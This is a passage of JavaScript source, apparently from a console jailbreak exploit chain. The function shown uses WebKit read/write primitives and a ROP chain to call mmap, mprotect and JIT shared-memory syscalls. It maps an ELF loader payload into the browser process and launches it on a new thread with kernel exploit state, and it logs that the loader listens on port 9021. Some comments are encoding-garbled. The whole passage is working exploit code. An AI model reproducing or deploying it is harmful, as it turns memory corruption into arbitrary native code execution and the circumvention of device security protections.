    return new int64(n >>> 0, Math.floor(n / 4294967296));
}

function _int64ToNum(v) {
    if (typeof v === 'number') return v;
    return v.hi * 4294967296 + (v.low >>> 0);
}

/**
 * åŠ è½½ elfldr åˆ°å½“å‰è¿›ç¨‹å¹¶å¯åŠ¨å®ƒ
 * @param {WebkitPrimitives} p
 * @param {worker_rop} chain
 * @param {int64} libKernelBase
 * @param {Object} opts
 */
async function run_elfldr(p, chain, libKernelBase, opts) {
    const umtxSyscall = {
        async mmap(addr, length, prot, flags, fd, offset) {
            const ret = p.malloc(0x8, 1);
            await chain.add_syscall_ret(ret, SYS_MMAP,
                _numToInt64(addr), length, prot, flags, fd, offset);
            await chain.run();
            return _int64ToNum(p.read8(ret));
        },
        async munmap(addr, size) {
            await chain.syscall(SYS_MUNMAP, _numToInt64(addr), size);
        },
        async mprotect(addr, size, prot) {
            await chain.syscall(SYS_MPROTECT, _numToInt64(addr), size, prot);
        },
        async jitshm_create(addr, size, prot) {
            const r = await chain.syscall(SYS_JITSHM_CREATE, addr, size, prot);
            return r.low;
        },
        async jitshm_alias(fd, prot) {
            const r = await chain.syscall(SYS_JITSHM_ALIAS, fd, prot);
            return r.low;
        },
        async close(fd) {
            await chain.syscall(SYS_CLOSE, fd);
        }
    };

    const umtxLibC = {
        malloc: function (size) {
            return p.malloc(size, 1);
        },
        free: function (_addr) { },
        memcpy: function (dst, src, size) {
            if (!size) return;
            const s = _numToInt64(src);
            const d = _numToInt64(dst);
            const srcArr = p.array_from_address(s, size);
            const snapshot = new Uint8Array(new Uint8Array(srcArr.buffer, 0, size));
            const dstArr = p.array_from_address(d, size);
            new Uint8Array(dstArr.buffer, 0, size).set(snapshot);
        }
    };

    const umtxJsio = {
        copyin: function (buf, addr) {
            const bytes = new Uint8Array(buf.buffer);
            const dst = p.array_from_address(_numToInt64(addr), bytes.length);
            dst.set(bytes);   // â˜… ç›´æ¥ set
        }
        // copyin: function (buf, addr) {
        //     const bytes = new Uint8Array(buf.buffer);
        //     const dst = p.array_from_address(_numToInt64(addr), bytes.length);
        //     new Uint8Array(dst.buffer, 0, bytes.length).set(bytes);
        // }
    };

    const autoldr_url = opts.elfldr_url || "payloads/elfldr.elf";

    log("[autoldr] loading " + autoldr_url + " ...", LogLevel.INFO);

    const loader = ElfLoader.create(umtxSyscall, umtxLibC, umtxJsio);

    let entry;
    try {
        entry = await loader.load(autoldr_url);
    } catch (e) {
        log("[autoldr] load failed: " + e, LogLevel.ERROR);
        return false;
    }
    log("[autoldr] entry point: 0x" + entry.toString(16), LogLevel.INFO);

    // æ„é€  entry å‚æ•°å—ï¼ˆ6 x u64 = 0x30ï¼‰
    const args = p.malloc(0x8 * 6, 1);
    for (let i = 0; i < 0x8 * 6; i++) p.write1(args.add32(i), 0);

    const rwpair = p.malloc(0x8, 1);
    p.write4(rwpair.add32(0x00), opts.master_sock);
    p.write4(rwpair.add32(0x04), opts.victim_sock);

    const payout = p.malloc(0x8, 1);
    p.write8(payout, 0);

    p.write8(args.add32(0x00), opts.dlsym_addr);
    p.write8(args.add32(0x08), opts.pipe_mem);
    p.write8(args.add32(0x10), rwpair);
    p.write8(args.add32(0x18), opts.pipe_addr);
    p.write8(args.add32(0x20), opts.kdata_base);
    p.write8(args.add32(0x28), payout);

    const pthread_handle = p.malloc(0x8, 1);
    p.write8(pthread_handle, 0);

    await chain.call(
        libKernelBase.add32(OFFSET_lk_pthread_create_name_np),
        pthread_handle,
        0,
        _numToInt64(entry),
        args,
        p.stringify("elfldr")
    );

    log("[autoldr] autoldr started, listening on :9021", LogLevel.SUCCESS);
    return true;
